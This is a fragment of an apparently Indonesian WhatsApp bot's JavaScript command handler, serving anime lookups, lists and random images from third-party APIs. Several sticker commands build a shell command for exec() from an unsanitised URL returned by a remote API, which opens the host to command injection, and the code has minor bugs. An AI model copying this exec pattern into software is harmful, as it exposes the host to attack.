		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
				client.sendMessage(from, bjangka(prefix), text, {quoted: mek})
			    break 
			case 'bjhari':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
				client.sendMessage(from, bjhari(prefix), text, {quoted: mek})
			    break 
			case 'bjtanggal':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
				client.sendMessage(from, bjtanggal(prefix), text, {quoted: mek})
			    break 
			case 'bjbulan':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
				client.sendMessage(from, bjbulan(prefix), text, {quoted: mek})
			    break 
			case 'bjmusim':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
				client.sendMessage(from, bjmusim(prefix), text, {quoted: mek})
			    break 
			case 'bjanggotatubuh':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
				client.sendMessage(from, anggotatubuh(prefix), text, {quoted: mek})
			    break 
			case 'bjwarna':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
				client.sendMessage(from, bjwarna(prefix), text, {quoted: mek})
			    break 
			case 'situsnontonanime':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
				client.sendMessage(from, situsnontonanime(prefix), text, {quoted: mek})
			    break 
			case 'situsbacamanga':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
				client.sendMessage(from, situsbacamanga(prefix), text, {quoted: mek})
			    break 
			case 'urutannontonfate':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
			    client.sendMessage(from, urutannontonfate(prefix), text, {quoted: mek})
			    break 
			case 'animelist':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
				client.sendMessage(from, animelist(prefix), text, {quoted: mek})
			    break 
			case 'sarananime':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
				client.sendMessage(from, sarananime(prefix), text, {quoted: mek})
			    break 
			case 'sarananimeaction':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
				client.sendMessage(from, action(prefix), text, {quoted: mek})
			    break 
			case 'sarananimeecchi':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
				client.sendMessage(from, ecchi(prefix), text, {quoted: mek})
			    break 
			case 'sarananimegore':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
				client.sendMessage(from, gore(prefix), text, {quoted: mek})
			    break 
			case 'sarananimeadventure':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
				client.sendMessage(from, adventure(prefix), text, {quoted: mek})
			    break 
			case 'sarananimeschool':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
				client.sendMessage(from, school(prefix), text, {quoted: mek})
			    break 
			case 'sarananimesliceoflife':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
				client.sendMessage(from, sliceoflife(prefix), text, {quoted: mek})
			    break 
			case 'sarananimevampire':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
				client.sendMessage(from, vampire(prefix), text, {quoted: mek})
			    break 
			case 'sarananimesport':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
			    client.sendMessage(from, sport(prefix), text, {quoted: mek})
			    break 
			case 'sarananimepsychological':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
				client.sendMessage(from, psychological(prefix), text, {quoted: mek})
			    break 
			case 'sarananimeloli':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
			    client.sendMessage(from, nimeloli(prefix), text, {quoted: mek})
			    break 
			case 'sarananimemovie':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
				client.sendMessage(from, movie(prefix), text, {quoted: mek})
			    break 
			case 'sarananimecomedy':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
			    client.sendMessage(from, comedy(prefix), text, {quoted: mek})
			    break
           case 'character':
			if (!isRegistered) return reply(mess.only.userB)
			if (isBanned) return reply(mess.only.benned)
			if (isLimit(sender)) return reply(mess.limituser)
                if (!isAnime) return reply(' Harus mengaktifkan mode anime ')
                    if (args.length == 0) return reply(`Example: ${prefix + command} Miku Nakano`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/character?apikey=${LolApi}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Id : ${get_result.id}\n`
                    ini_txt += `Name : ${get_result.name.full}\n`
                    ini_txt += `Native : ${get_result.name.native}\n`
                    ini_txt += `Favorites : ${get_result.favourites}\n`
                    ini_txt += `Media : \n`
                    ini_media = get_result.media.nodes
                    for (var x of ini_media) {
                        ini_txt += `- ${x.title.romaji} (${x.title.native})\n`
                    }
                    ini_txt += `\nDescription : \n${get_result.description.replace(/__/g, "_")}`
                    thumbnail = await getBuffer(get_result.image.large)
                client.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    await limitAdd(sender)
                    break
                case 'mangasearch':
					if (!isRegistered) return reply(mess.only.userB)
					if (isBanned) return reply(mess.only.benned)
					if (isLimit(sender)) return reply(mess.limituser)
                if (!isAnime) return reply(' Harus mengaktifkan mode anime ')
                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/manga?apikey=${LolApi}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Id : ${get_result.id}\n`
                    ini_txt += `Id MAL : ${get_result.idMal}\n`
                    ini_txt += `Title : ${get_result.title.romaji}\n`
                    ini_txt += `English : ${get_result.title.english}\n`
                    ini_txt += `Native : ${get_result.title.native}\n`
                    ini_txt += `Format : ${get_result.format}\n`
                    ini_txt += `Chapters : ${get_result.chapters}\n`
                    ini_txt += `Volume : ${get_result.volumes}\n`
                    ini_txt += `Status : ${get_result.status}\n`
                    ini_txt += `Source : ${get_result.source}\n`
                    ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
                    ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
                    ini_txt += `Genre : ${get_result.genres.join(", ")}\n`
                    ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`
                    ini_txt += `Score : ${get_result.averageScore}%\n`
                    ini_txt += `Characters : \n`
                    ini_character = get_result.characters.nodes
                    for (var x of ini_character) {
                        ini_txt += `- ${x.name.full} (${x.name.native})\n`
                    }
                    ini_txt += `\nDescription : ${get_result.description}`
                    thumbnail = await getBuffer(get_result.coverImage.large)
                    client.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    await limitAdd(sender)
                    break
                case 'animesearch':
					if (!isRegistered) return reply(mess.only.userB)
					if (isBanned) return reply(mess.only.benned)
					if (isLimit(sender)) return reply(mess.limituser)
                if (!isAnime) return reply(' Harus mengaktifkan mode anime ')
                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/anime?apikey=${LolApi}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Id : ${get_result.id}\n`
                    ini_txt += `Id MAL : ${get_result.idMal}\n`
                    ini_txt += `Title : ${get_result.title.romaji}\n`
                    ini_txt += `English : ${get_result.title.english}\n`
                    ini_txt += `Native : ${get_result.title.native}\n`
                    ini_txt += `Format : ${get_result.format}\n`
                    ini_txt += `Episodes : ${get_result.episodes}\n`
                    ini_txt += `Duration : ${get_result.duration} mins.\n`
                    ini_txt += `Status : ${get_result.status}\n`
                    ini_txt += `Season : ${get_result.season}\n`
                    ini_txt += `Season Year : ${get_result.seasonYear}\n`
                    ini_txt += `Source : ${get_result.source}\n`
                    ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
                    ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
                    ini_txt += `Genre : ${get_result.genres.join(", ")}\n`
                    ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`
                    ini_txt += `Score : ${get_result.averageScore}%\n`
                    ini_txt += `Characters : \n`
                    ini_character = get_result.characters.nodes
                    for (var x of ini_character) {
                        ini_txt += `- ${x.name.full} (${x.name.native})\n`
                    }
                    ini_txt += `\nDescription : ${get_result.description}`
                    thumbnail = await getBuffer(get_result.coverImage.large)
                client.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    await limitAdd(sender)
                    break
                case 'waifu':
                case 'shota':
                case 'husbu':
                case 'neko':
                case 'loli':
                case 'sagiri':
                case 'kanna':
                case 'shinobu':
                case 'megumin':
                case 'wallnime':
                case 'bully':
                case 'cuddle':
                case 'cry':
                case 'kiss':
                case 'hug':
                case 'awoo':
                case 'lick':
                case 'pat':
                case 'smug':
                case 'bonk':
                case 'yeet':
                case 'blush':
                case 'smile':
                case 'wave':
                case 'highfive':
                case 'handhold':
                case 'nom':
                case 'bite':
                case 'glomp':
                case 'kill':
                case 'slap':
                case 'happy':
                case 'wink':
                case 'poke':
                case 'dance':
                case 'cringe':
                case 'blush':
					if (!isRegistered) return reply(mess.only.userB)
					if (isBanned) return reply(mess.only.benned)
					if (isLimit(sender)) return reply(mess.limituser)
                    if (!isAnime) return reply(' Harus mengaktifkan mode anime ')
			     	reply (mess.wait)
                    getBuffer(`http://api.lolhuman.xyz/api/random/${command}?apikey=${LolApi}`).then((gambar) => {
                    client.sendMessage(from, gambar, image, { quoted: mek })
                    })
                    await limitAdd(sender)
                    break
           case 'animecry':
					cry = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/cry?apikey=${TobzApi}`, {method: 'get'})
                	if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
					exec(`wget ${anu.result} -O ${cry} && ffmpeg -i ${cry} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(cry)
						buffer = fs.readFileSync(rano)
						client.sendMessage(from, buffer, sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					await limitAdd(sender) 
					break 
				case 'animehug':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/hug?apikey=${TobzApi}`, {method: 'get'})
					exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(ranp)
						buffer = fs.readFileSync(rano)
						client.sendMessage(from, buffer, sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					await limitAdd(sender) 
					break 
           case 'kusonime':
		      	if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
                if (!isAnime) return reply(' Harus mengaktifkan mode anime ')
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://kusonime.com/nanatsu-no-taizai-bd-batch-subtitle-indonesia/`)
                    ini_url = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/kusonime?apikey=${LolApi}&url=${ini_url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Japanese : ${get_result.japanese}\n`
                    ini_txt += `Genre : ${get_result.genre}\n`
                    ini_txt += `Seasons : ${get_result.seasons}\n`
                    ini_txt += `Producers : ${get_result.producers}\n`
                    ini_txt += `Type : ${get_result.type}\n`
                    ini_txt += `Status : ${get_result.status}\n`
                    ini_txt += `Total Episode : ${get_result.total_episode}\n`
                    ini_txt += `Score : ${get_result.score}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Released On : ${get_result.released_on}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    link_dl = get_result.link_dl
                    for (var x in link_dl) {
                        ini_txt += `\n${x}\n`
                        for (var y in link_dl[x]) {
                            ini_txt += `${y} - ${link_dl[x][y]}\n`
                        }
                    }
                    ini_buffer = await getBuffer(get_result.thumbnail)
                    await client.sendMessage(from, ini_buffer, image, { quoted: mek, caption: ini_txt })
                    await limitAdd(sender) 
                    break
            case 'kusonimesearch':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
                if (!isAnime) return reply(' Harus mengaktifkan mode anime ')
                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(" ")
					reply (mess.wait)
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/kusonimesearch?apikey=${LolApi}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Japanese : ${get_result.japanese}\n`
                    ini_txt += `Genre : ${get_result.genre}\n`
                    ini_txt += `Seasons : ${get_result.seasons}\n`
                    ini_txt += `Producers : ${get_result.producers}\n`
                    ini_txt += `Type : ${get_result.type}\n`
                    ini_txt += `Status : ${get_result.status}\n`
                    ini_txt += `Total Episode : ${get_result.total_episode}\n`
                    ini_txt += `Score : ${get_result.score}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Released On : ${get_result.released_on}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    link_dl = get_result.link_dl
                    for (var x in link_dl) {
                        ini_txt += `\n${x}\n`
                        for (var y in link_dl[x]) {
                            ini_txt += `${y} - ${link_dl[x][y]}\n`
                        }
                    }
                    ini_buffer = await getBuffer(get_result.thumbnail)
                    await client.sendMessage(from, ini_buffer, image, { quoted: mek, caption: ini_txt })
                    await limitAdd(sender) 
                    break
                case 'otakudesu':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
                    if (!isAnime) return reply(' Harus mengaktifkan mode anime ')
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://otakudesu.tv/lengkap/pslcns-sub-indo/`)
                    ini_url = args[0]
					reply (mess.wait)
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/otakudesu?apikey=${LolApi}&url=${ini_url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Japanese : ${get_result.japanese}\n`
                    ini_txt += `Judul : ${get_result.judul}\n`
                    ini_txt += `Type : ${get_result.type}\n`
                    ini_txt += `Episode : ${get_result.episodes}\n`
                    ini_txt += `Aired : ${get_result.aired}\n`
                    ini_txt += `Producers : ${get_result.producers}\n`
                    ini_txt += `Genre : ${get_result.genres}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Studios : ${get_result.status}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Credit : ${get_result.credit}\n`
                    get_link = get_result.link_dl
                    for (var x in get_link) {
                        ini_txt += `\n\n*${get_link[x].title}*\n`
                        for (var y in get_link[x].link_dl) {
                            ini_info = get_link[x].link_dl[y]
                            ini_txt += `\n\`\`\`Reso : \`\`\`${ini_info.reso}\n`
                            ini_txt += `\`\`\`Size : \`\`\`${ini_info.size}\n`
                            ini_txt += `\`\`\`Link : \`\`\`\n`
                            down_link = ini_info.link_dl
                            for (var z in down_link) {
                                ini_txt += `${z} - ${down_link[z]}\n`
                            }
                        }
                    }
                    reply(ini_txt)
                    await limitAdd(sender) 
                    break
                case 'otakudesusearch':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
                    if (!isAnime) return reply(' Harus mengaktifkan mode anime ')
                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(" ")
					reply (mess.wait)
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/otakudesusearch?apikey=${LolApi}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Japanese : ${get_result.japanese}\n`
                    ini_txt += `Judul : ${get_result.judul}\n`
                    ini_txt += `Type : ${get_result.type}\n`
                    ini_txt += `Episode : ${get_result.episodes}\n`
                    ini_txt += `Aired : ${get_result.aired}\n`
                    ini_txt += `Producers : ${get_result.producers}\n`
                    ini_txt += `Genre : ${get_result.genres}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Studios : ${get_result.status}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Credit : ${get_result.credit}\n`
                    get_link = get_result.link_dl
                    for (var x in get_link) {
                        ini_txt += `\n\n*${get_link[x].title}*\n`
                        for (var y in get_link[x].link_dl) {
                            ini_info = get_link[x].link_dl[y]
                            ini_txt += `\n\`\`\`Reso : \`\`\`${ini_info.reso}\n`
                            ini_txt += `\`\`\`Size : \`\`\`${ini_info.size}\n`
                            ini_txt += `\`\`\`Link : \`\`\`\n`
                            down_link = ini_info.link_dl
                            for (var z in down_link) {
                                ini_txt += `${z} - ${down_link[z]}\n`
                            }
                        }
                    }
                    reply(ini_txt)
                    await limitAdd(sender) 
                    break

              case 'anime':
				    if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
                    if (!isAnime) return reply(' Harus mengaktifkan mode anime ')
					reply (mess.wait)
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/randomanime?apikey=${TobzApi}`, {method: 'get'})
					pok = await getBuffer(anu.result)
					client.sendMessage(from, pok, image, { quoted: mek , caption: 'nihhh'})
					await limitAdd(sender) 
					break  
				case 'animekiss':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
                    if (!isAnime) return reply(' Harus mengaktifkan mode anime ')
					reply (mess.wait)
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/kiss?apikey=${TobzApi}`, {method: 'get'})
					exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(ranp)
						buffer = fs.readFileSync(rano)
					client.sendMessage(from, buffer, sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					await limitAdd(sender) 
					break 
				case 'naruto':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
					if (!isAnime) return reply(' Harus mengaktifkan mode anime ')
					reply (mess.wait)
					ini_url = await fetchJson(`http://api.lolhuman.xyz/api/pinterest?apikey=${LolApi}&query=naruto`)
					ini_url = ini_url.result
					nye = await getBuffer(ini_url)
					client.sendMessage(from, nye, image, { caption: 'naruto!!', quoted: mek })
					await limitAdd(sender)
					break 
				case 'minato':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
					if (!isAnime) return reply(' Harus mengaktifkan mode anime ')
					reply (mess.wait)
					ini_url = await fetchJson(`http://api.lolhuman.xyz/api/pinterest?apikey=${LolApi}&query=minato`)
					ini_url = ini_url.result
					nye = await getBuffer(ini_url)
					client.sendMessage(from, nye, image, { caption: 'minato!!', quoted: mek })
					await limitAdd(sender)
					break 
				case 'boruto':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
					if (!isAnime) return reply(' Harus mengaktifkan mode anime ')
					reply (mess.wait)
					ini_url = await fetchJson(`http://api.lolhuman.xyz/api/pinterest?apikey=${LolApi}&query=boruto`)
					ini_url = ini_url.result
					nye = await getBuffer(ini_url)
					client.sendMessage(from, nye, image, { caption: 'boruto!!', quoted: mek })
					await limitAdd(sender)
					break 
				case 'hinata':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
					if (!isAnime) return reply(' Harus mengaktifkan mode anime ')
					reply (mess.wait)
					ini_url = await fetchJson(`http://api.lolhuman.xyz/api/pinterest?apikey=${LolApi}&query=hinata`)
					ini_url = ini_url.result
					nye = await getBuffer(ini_url)
					client.sendMessage(from, nye, image, { caption: 'hinata!!', quoted: mek })
					await limitAdd(sender)
					break 
				case 'sasuke':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
					if (!isAnime) return reply(' Harus mengaktifkan mode anime ')
					reply (mess.wait)
					ini_url = await fetchJson(`http://api.lolhuman.xyz/api/pinterest?apikey=${LolApi}&query=sasuke`)
					ini_url = ini_url.result
					nye = await getBuffer(ini_url)
			    	client.sendMessage(from, nye, image, { caption: 'sasuke!!', quoted: mek })
					await limitAdd(sender) 
					break 
				case 'sakura':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
					if (!isAnime) return reply(' Harus mengaktifkan mode anime ')
					reply (mess.wait)
					ini_url = await fetchJson(`http://api.lolhuman.xyz/api/pinterest?apikey=${LolApi}&query=sakura`)
					ini_url = ini_url.result
					ini_buffer = await getBuffer(ini_url)
					client.sendMessage(from, nye, image, { caption: 'sakura!!', quoted: mek })
					await limitAdd(sender) 
					break 

				case 'kaneki':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
					if (!isAnime) return reply(' Harus mengaktifkan mode anime ')
					reply (mess.wait)
					anu = await fetchJson(`https://api.vhtear.com/pinterest?query=kaneki&apikey=${VthearApi}`, {method: 'get'})
					var ka = JSON.parse(JSON.stringify(anu.result));
					var ne =  ka[Math.floor(Math.random() * ka.length)];
					ki = await getBuffer(ne)
			    	client.sendMessage(from, ki, image, { caption: 'kaneki!!', quoted: mek })
					await limitAdd(sender) 
					break 
				case 'toukachan':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
					if (!isAnime) return reply(' Harus mengaktifkan mode anime ')
					reply (mess.wait)
					ini_url = await fetchJson(`http://api.lolhuman.xyz/api/pinterest?apikey=${LolApi}&query=toukachan`)
					ini_url = ini_url.result
					nye = await getBuffer(ini_url)
					client.sendMessage(from, nye, image, { caption: 'toukachan!!', quoted: mek })
					await limitAdd(sender) 
					break 
				case 'rize':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
					if (!isAnime) return reply(' Harus mengaktifkan mode anime ')
					reply (mess.wait)
					ini_url = await fetchJson(`http://api.lolhuman.xyz/api/pinterest?apikey=${LolApi}&query=rize`)
					ini_url = ini_url.result
					nye = await getBuffer(ini_url)
					client.sendMessage(from, nye, image, { caption: 'rize chan!!', quoted: mek })
					await limitAdd(sender) 	
					break 
				case 'akira':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
					if (!isAnime) return reply(' Harus mengaktifkan mode anime ')
					reply (mess.wait)
					ini_url = await fetchJson(`http://api.lolhuman.xyz/api/pinterest?apikey=${LolApi}&query=akira`)
					ini_url = ini_url.result
					nye = await getBuffer(ini_url)
					client.sendMessage(from, nye, image, { caption: 'akira chan!!', quoted: mek })
					await limitAdd(sender) 
					break 
				case 'itori':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
					if (!isAnime) return reply(' Harus mengaktifkan mode anime ')
					reply (mess.wait)
					ini_url = await fetchJson(`http://api.lolhuman.xyz/api/pinterest?apikey=${LolApi}&query=itori}`)
					ini_url = ini_url.result
					nye = await getBuffer(ini_url)
					client.sendMessage(from, nye, image, { caption: 'itori chan!!', quoted: mek })
					await limitAdd(sender) 
					break 
				case 'kurumi':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
					if (!isAnime) return reply(' Harus mengaktifkan mode anime ')
					reply(mess.wait)
					ini_url = await fetchJson(`http://api.lolhuman.xyz/api/pinterest?apikey=${LolApi}&query=kurumi`)
					ini_url = ini_url.result
					nye = await getBuffer(ini_url)
					client.sendMessage(from, nye, image, { caption: 'kurumi chan!!', quoted: mek })
					await limitAdd(sender) 
					break 
				case 'hatsunemiku':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
					if (!isAnime) return reply(' Harus mengaktifkan mode anime ')
					reply(mess.wait)
					ini_url = await fetchJson(`http://api.lolhuman.xyz/api/pinterest?apikey=${LolApi}&query=hatsunemiku`)
					ini_url = ini_url.result
					nye = await getBuffer(ini_url)
					client.sendMessage(from, nye, image, { caption: 'miku chan!!', quoted: mek })
					await limitAdd(sender) 
					break 
			    case 'quotesanime':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
				    if (!isAnime) return reply(' Harus mengaktifkan mode anime ')
					reply (mess.wait)
                    ini_quotes = await fetchJson(`http://api.lolhuman.xyz/api/random/quotesnime?apikey=${LolApi}`)
                    ini_quotes = ini_quotes.result
                    ini_quote = ini_quotes.quote
                    ini_character = ini_quotes.character
                    ini_anime = ini_quotes.anime
                    ini_episode = ini_quotes.episode
                    reply(`_${ini_quote}_\n\n*― ${ini_character}*\n*― ${ini_anime} ${ini_episode}*`)
                    await limitAdd(sender) 
                    break
                  case 'quotesnime':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
				    if (!isAnime) return reply(' Harus mengaktifkan mode anime ')
					reply (mess.wait)
                    quotenime = await fetchJson(`http://api.lolhuman.xyz/api/random/quotesnime?apikey=${LolApi}`)
                    reply(quotenime.result)
                    await limitAdd(sender) 
                    break
               case 'konachan':
            	if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
                    if (args.length == 0) return reply(`Usage: ${prefix + command} query\nExample: ${prefix + command} azur_lane`)
                    query = args.join(" ")
					reply (mess.wait)
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/konachan?apikey=${LolApi}&query=${query}`)
                    client.sendMessage(from, ini_buffer, image, { quoted: mek })
                    await limitAdd(sender) 
                    break
               case 'bokunh':
				if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
				 data = fs.readFileSync('./IXBTEAM/bokunohero.js');
                 jsonData = JSON.parse(data);
                 rannikdex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[rannikdex];
                 bokunohero = await getBuffer(randKey.result)
                 client.sendMessage(from, bokunohero, image, { quoted: mek })
                 await limitAdd(sender)
				 break
			 case 'sao':
				if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
				 data = fs.readFileSync('./IXBTEAM/swortartonline.js');
                 jsonData = JSON.parse(data);
                 rannikdex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[rannikdex];
                 swordartonline = await getBuffer(randKey.result)
                client.sendMessage(from, swordartonline, image, {quoted: mek})
